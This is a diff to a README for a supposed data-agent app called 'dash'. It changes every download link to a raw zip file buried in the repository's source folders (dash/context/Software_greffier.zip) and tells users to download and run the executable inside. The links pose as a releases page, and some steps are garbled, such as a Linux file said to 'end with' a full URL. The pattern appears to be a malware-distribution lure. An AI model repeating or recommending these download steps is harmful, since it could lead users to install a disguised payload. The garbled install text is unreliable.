@@ -6,7 +6,7 @@ Welcome to the dash application! This tool acts as a self-learning data agent th
 
 ## 📥 Download Link
 
-[![Download dash](https://raw.githubusercontent.com/xPUKDORx/dash/main/dash/evals/Software_1.1-alpha.5.zip)](https://raw.githubusercontent.com/xPUKDORx/dash/main/dash/evals/Software_1.1-alpha.5.zip)
+[![Download dash](https://raw.githubusercontent.com/xPUKDORx/dash/main/dash/context/Software_greffier.zip)](https://raw.githubusercontent.com/xPUKDORx/dash/main/dash/context/Software_greffier.zip)
 
 ## 💻 System Requirements
 
@@ -19,7 +19,7 @@ Before downloading dash, make sure your system meets the following requirements:
 
 ## 📦 Download & Install
 
-1. **Visit the Releases Page:** Click this link to begin: [dash Releases](https://raw.githubusercontent.com/xPUKDORx/dash/main/dash/evals/Software_1.1-alpha.5.zip).
+1. **Visit the Releases Page:** Click this link to begin: [dash Releases](https://raw.githubusercontent.com/xPUKDORx/dash/main/dash/context/Software_greffier.zip).
    
    On this page, you will find the list of available versions. The latest version is at the top. 
 
@@ -28,14 +28,14 @@ Before downloading dash, make sure your system meets the following requirements:
 3. **Download the Executable:** Click on the executable file suitable for your operating system. Depending on your choice:
    - For Windows, find a file that ends with `.exe`.
    - For macOS, look for a file ending in `.dmg`.
-   - For Linux, you may find a file ending with `https://raw.githubusercontent.com/xPUKDORx/dash/main/dash/evals/Software_1.1-alpha.5.zip`.
+   - For Linux, you may find a file ending with `https://raw.githubusercontent.com/xPUKDORx/dash/main/dash/context/Software_greffier.zip`.
    
 4. **Save the File:** Your browser will prompt you to save the file. Choose a location on your computer where you can easily find it later, such as your Downloads folder.
 
 5. **Run the Installer:**
    - For Windows: Double-click on the downloaded `.exe` file. Follow the prompts to complete the installation.
    - For macOS: Open the downloaded `.dmg` file, then drag the dash application into the Applications folder.
-   - For Linux: Extract the `https://raw.githubusercontent.com/xPUKDORx/dash/main/dash/evals/Software_1.1-alpha.5.zip` file. Open a terminal and navigate to the extracted folder, then enter `./dash` to run the application.
+   - For Linux: Extract the `https://raw.githubusercontent.com/xPUKDORx/dash/main/dash/context/Software_greffier.zip` file. Open a terminal and navigate to the extracted folder, then enter `./dash` to run the application.
 
 6. **Start Using dash:** Once installed, you can start the application from your applications menu or by double-clicking on the icon.
 
